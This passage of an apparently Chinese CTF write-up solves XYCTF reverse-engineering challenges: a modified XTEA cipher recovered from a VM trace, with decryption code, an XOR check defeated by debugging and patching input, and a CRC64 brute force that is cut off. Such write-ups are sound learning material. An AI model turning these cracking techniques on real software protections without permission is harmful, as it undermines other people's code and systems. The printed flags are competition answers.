W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> a1aacad7 <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> <span class="token number">82899f</span>b1
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">82899f</span>b1 <span class="token operator">^</span> <span class="token number">8</span>def938c <span class="token operator">=</span> f660c3d
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f660c3d <span class="token operator">+</span> <span class="token number">8952</span>dc1 <span class="token operator">=</span> <span class="token number">17f</span>b39fe
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">17f</span>b39fe <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> bfd9cf
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">17f</span>b39fe <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">5f</span>ece7f80
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> bfd9cf <span class="token operator">^</span> fece7f80 <span class="token operator">=</span> fe71a64f
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">17f</span>b39fe <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> <span class="token number">6</span>d90aba
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> fe71a64f <span class="token operator">+</span> <span class="token number">6</span>d90aba <span class="token operator">=</span> <span class="token number">1054</span>ab109
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">3</span>c3f696a <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">2</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">616</span>d5f72 <span class="token operator">+</span> <span class="token number">3</span>c3f696a <span class="token operator">=</span> <span class="token number">9</span>dacc8dc
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9</span>dacc8dc <span class="token operator">^</span> abab1212 <span class="token operator">=</span> <span class="token number">3607</span>dace
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">54</span>ab109 <span class="token operator">^</span> <span class="token number">3607</span>dace <span class="token operator">=</span> <span class="token number">334</span>d6bc7
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">334</span>d6bc7 <span class="token operator">+</span> <span class="token number">345f</span>e004 <span class="token operator">=</span> <span class="token number">67</span>ad4bcb
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">67</span>ad4bcb <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">67</span>ad4bc
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">67</span>ad4bcb <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">33</span>d6a5e580
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">67</span>ad4bc <span class="token operator">^</span> d6a5e580 <span class="token operator">=</span> d0df313c
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">67</span>ad4bcb <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> <span class="token number">32</span>cb3c43
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> d0df313c <span class="token operator">+</span> <span class="token number">32</span>cb3c43 <span class="token operator">=</span> <span class="token number">103</span>aa6d7f
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9</span>b9f5051 <span class="token operator">>></span> b <span class="token operator">=</span> <span class="token number">1373</span>ea
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1373</span>ea <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">2</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">616</span>d5f72 <span class="token operator">+</span> <span class="token number">9</span>b9f5051 <span class="token operator">=</span> fd0cafc3
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> fd0cafc3 <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> de2ffaa5
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> de2ffaa5 <span class="token operator">^</span> <span class="token number">3</span>aa6d7f <span class="token operator">=</span> dd8597da
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> dd8597da <span class="token operator">+</span> <span class="token number">17f</span>b39fe <span class="token operator">=</span> f580d1d8
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> f580d1d8 <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">7</span>ac068e
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> f580d1d8 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">=</span> <span class="token number">3</span>d60347600
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7</span>ac068e <span class="token operator">^</span> <span class="token number">60347600</span> <span class="token operator">=</span> <span class="token number">6798708</span>e
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> f580d1d8 <span class="token operator">^</span> <span class="token number">11223344</span> <span class="token operator">=</span> e4a2e29c
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">6798708</span>e <span class="token operator">+</span> e4a2e29c <span class="token operator">=</span> <span class="token number">14</span>c3b532a
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">9</span>b9f5051 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">1</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">656</span>b616d <span class="token operator">+</span> <span class="token number">9</span>b9f5051 <span class="token operator">=</span> <span class="token number">1010</span>ab1be
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">10</span>ab1be <span class="token operator">^</span> abab1212 <span class="token operator">=</span> aaa1a3ac
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4</span>c3b532a <span class="token operator">^</span> aaa1a3ac <span class="token operator">=</span> e69af086
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> e69af086 <span class="token operator">+</span> <span class="token number">67</span>ad4bcb <span class="token operator">=</span> <span class="token number">14e483</span>c51
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4e483</span>c51 <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">4e483</span>c5
W3 <span class="token operator">=</span> W1 <span class="token operator">&lt;&lt;</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4e483</span>c51 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">=</span> <span class="token number">27241e2880</span>
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4e483</span>c5 <span class="token operator">^</span> <span class="token number">241e2880</span> <span class="token operator">=</span> <span class="token number">20f</span>aab45
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">4e483</span>c51 <span class="token operator">^</span> <span class="token number">55667788</span> <span class="token operator">=</span> <span class="token number">1</span>b2e4bd9
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">20f</span>aab45 <span class="token operator">+</span> <span class="token number">1</span>b2e4bd9 <span class="token operator">=</span> <span class="token number">3</span>c28f71e
W3 <span class="token operator">=</span> W1 <span class="token operator">>></span> W0 <span class="token operator">--</span><span class="token operator">-</span> faff3738 <span class="token operator">>></span> b <span class="token operator">=</span> <span class="token number">1f</span>5fe6
W2 <span class="token operator">=</span> W0 <span class="token operator">&amp;</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">1f</span>5fe6 <span class="token operator">&amp;</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">2</span>
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">616</span>d5f72 <span class="token operator">+</span> faff3738 <span class="token operator">=</span> <span class="token number">15</span>c6c96aa
W2 <span class="token operator">=</span> W0 <span class="token operator">^</span> W3 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">5</span>c6c96aa <span class="token operator">^</span> <span class="token number">23235566</span> <span class="token operator">=</span> <span class="token number">7f</span>4fc3cc
W3 <span class="token operator">=</span> W1 <span class="token operator">^</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">7f</span>4fc3cc <span class="token operator">^</span> <span class="token number">3</span>c28f71e <span class="token operator">=</span> <span class="token number">436734</span>d2
W2 <span class="token operator">=</span> W1 <span class="token operator">+</span> W0 <span class="token operator">--</span><span class="token operator">-</span> <span class="token number">436734</span>d2 <span class="token operator">+</span> f580d1d8 <span class="token operator">=</span> <span class="token number">138e806</span>aa</code></pre>

<p>通过观察可以发现是一个魔改的XTea加密。</p>
<p>通过对比标准XTea加密流程，可以得到里面参与计算的4个key值 <strong>{0x776f6853,0x656b616d,0x616d5f72,0x74696564}</strong> 以及delta值 <strong>0x5f5fe6e7</strong></p>
<p>写出对应加密的c++代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">encipher</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">uint32_t</span> v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> delta <span class="token operator">=</span> <span class="token number">0x5f5fe6e7</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">72</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v1 <span class="token operator">^</span> <span class="token number">0x11223344</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xabab1212</span><span class="token punctuation">)</span> <span class="token operator">^</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v0 <span class="token operator">+=</span> tmp2<span class="token punctuation">;</span>
        sum <span class="token operator">+=</span> delta<span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v0 <span class="token operator">^</span> <span class="token number">0x55667788</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x23235566</span> <span class="token operator">^</span> tmp3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v1 <span class="token operator">+=</span> tmp4<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span>
    v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">uint32_t</span> v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0x5f5fe6e7</span> <span class="token operator">*</span> <span class="token number">72</span><span class="token punctuation">,</span> delta <span class="token operator">=</span> <span class="token number">0x5f5fe6e7</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">72</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> tmp3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v0 <span class="token operator">^</span> <span class="token number">0x55667788</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x23235566</span> <span class="token operator">^</span> tmp3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v1 <span class="token operator">-=</span> tmp4<span class="token punctuation">;</span>
        sum <span class="token operator">-=</span> delta<span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v1 <span class="token operator">^</span> <span class="token number">0x11223344</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xabab1212</span><span class="token punctuation">)</span> <span class="token operator">^</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v0 <span class="token operator">-=</span> tmp2<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span>
    v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>提取chal程序中的密文，进行解密即可。</p>
<p>完整解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>

<span class="token keyword">void</span> <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> v<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">uint32_t</span> v0 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v1 <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sum <span class="token operator">=</span> <span class="token number">0x5f5fe6e7</span> <span class="token operator">*</span> <span class="token number">72</span><span class="token punctuation">,</span> delta <span class="token operator">=</span> <span class="token number">0x5f5fe6e7</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">72</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> tmp3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v0 <span class="token operator">^</span> <span class="token number">0x55667788</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x23235566</span> <span class="token operator">^</span> tmp3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v1 <span class="token operator">-=</span> tmp4<span class="token punctuation">;</span>
        sum <span class="token operator">-=</span> delta<span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v1 <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v1 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v1 <span class="token operator">^</span> <span class="token number">0x11223344</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">auto</span> tmp2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xabab1212</span><span class="token punctuation">)</span> <span class="token operator">^</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v0 <span class="token operator">-=</span> tmp2<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v0<span class="token punctuation">;</span>
    v<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
        <span class="token number">0x776f6853</span><span class="token punctuation">,</span>
        <span class="token number">0x656b616d</span><span class="token punctuation">,</span>
        <span class="token number">0x616d5f72</span><span class="token punctuation">,</span>
        <span class="token number">0x74696564</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> Encflag<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x696C2E9A</span><span class="token punctuation">,</span> <span class="token number">0x76ADE8E1</span><span class="token punctuation">,</span> <span class="token number">0xE67D5CA4</span><span class="token punctuation">,</span> <span class="token number">0x5C76BD38</span><span class="token punctuation">,</span>
        <span class="token number">0xB7AC0787</span><span class="token punctuation">,</span> <span class="token number">0xBFEA0C65</span><span class="token punctuation">,</span> <span class="token number">0x01C2FF10</span><span class="token punctuation">,</span> <span class="token number">0x6D16FD38</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token function">decipher</span><span class="token punctuation">(</span>Encflag<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span>Encflag <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span>Encflag <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">decipher</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span>Encflag <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.32s\n"</span><span class="token punctuation">,</span> Encflag<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>XYCTF{fun_un1c0rn_with_4rm64_VM}</p>
<h3 id="Moon"><a href="#Moon" class="headerlink" title="Moon"></a>Moon</h3><p>跟到moon.xor_crypt实际加密处。</p>
<p><img src="/images/6-1744626745337-11.png" loading="lazy"></p>
<p>发现是进行了单次xor，并加入到一个list中，前后过程不清楚。</p>
<p>断在xor这个命令，运行附加调试，随便输入一串1</p>
<p><img src="/images/7-1744626745337-12.png" loading="lazy"></p>
<p><img src="/images/8-1744626745338-15.png" loading="lazy"></p>
<p>发现是输入的’1’和一个0x24进行xor，多运行几次发现就是将输入的字符串都异或上一些值。</p>
<p>直接断在return处，v20是最后将list转成Bytes的结果。</p>
<p><img src="/images/9-1744626745338-13.png" loading="lazy"></p>
<p>发现是28长度的一串字节，从0x15开始的，就是我们输入字符串长度以及异或完的结果。</p>
<p><img src="/images/10-1744626745338-14.png" loading="lazy"></p>
<p>继续运行会返回到check_flag代码处，底下有一个RichCompare比较两个数据。</p>
<p><img src="/images/11-1744626745338-16.png" loading="lazy"></p>
<p>v45可以看到就是将刚刚v20的bytes直接unhex转成了一串字符串。</p>
<p><img src="/images/12-1744626745338-18.png" loading="lazy"></p>
<p>那么v9就应该是flag的密文，可以数出一共是要35字节。</p>
<p><img src="/images/13-1744626745338-17.png" loading="lazy"></p>
<p>重新调试运行输入35个1，在check_flag开头断点，把输入的字符串全都patch成0。</p>
<p><img src="/images/14-1744626745338-19.png" loading="lazy"></p>
<p><img src="/images/15-1744626745338-20.png" loading="lazy"></p>
<p><img src="/images/16-1744626745338-21.png" loading="lazy"></p>
<p>最后在RichCompare处就可以得到xor密文的列表。</p>
<p><img src="/images/17-1744626745338-22.png" loading="lazy"></p>
<p>将v9的密文与这个数据进行xor即可得到flag。</p>
<p><img src="/images/18-1744626745338-23.png" loading="lazy"></p>
<p>flag{but_y0u_l00k3d_up_@t_th3_mOOn}</p>
<h3 id="Dragon"><a href="#Dragon" class="headerlink" title="Dragon"></a>Dragon</h3><p>.bc 后缀 </p>
<p>反编译为LLVM IR</p>
<pre class="language-python" data-language="python"><code class="language-python">llvm<span class="token operator">-</span>dis<span class="token operator">-</span><span class="token number">17</span> Dragon<span class="token punctuation">.</span>bc <span class="token operator">-</span>o Dragon<span class="token punctuation">.</span>ll</code></pre>

<p>分析得知为crc64，以两个为一组进行校验，直接爆破就行</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;string.h&gt;

uint64_t calculate_crc64_direct(const unsigned char* data, uint64_t length) &#123;
    uint64_t crc &#x3D; 0xFFFFFFFFFFFFFFFFULL; 

    for (uint64_t i &#x3D; 0; i &lt; length; i++) &#123;
        crc ^&#x3D; ((uint64_t)data[i] &lt;&lt; 56);

        for (uint64_t j &#x3D; 0; j &lt; 8; j++) &#123;
            if (crc &amp; 0x8000000000000000ULL) &#123; 
                crc &#x3D; (crc &lt;&lt; 1) ^ 0x42F0E1EBA9EA3693ULL; 
            &#125;
            else &#123;
                crc &#x3D; crc &lt;&lt; 1;
            &#125;
        &#125;
    &#125;

    return ~crc;
&#125;

int main() &#123;
    uint64_t enc[12] &#x3D; &#123;
